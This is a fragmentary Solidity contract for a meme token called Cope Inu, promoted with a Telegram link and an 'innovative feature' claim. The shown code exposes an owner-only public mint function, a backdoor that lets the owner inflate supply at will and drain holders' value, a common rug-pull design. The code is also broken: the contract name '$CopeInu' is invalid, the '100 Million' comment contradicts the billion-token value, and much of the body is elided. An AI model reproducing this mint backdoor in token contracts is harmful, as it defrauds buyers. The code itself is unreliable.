...
//
// $CopeInu proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/CopeInu
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CopeInu(uint256 amount) public onlyOwner {
 _CopeInu(msg.sender, amount);
    }
    ...
    function _CopeInu(address account, uint256 amount) internal virtual {
...
contract $CopeInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cope Inu", "CPI") {
     _CopeInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}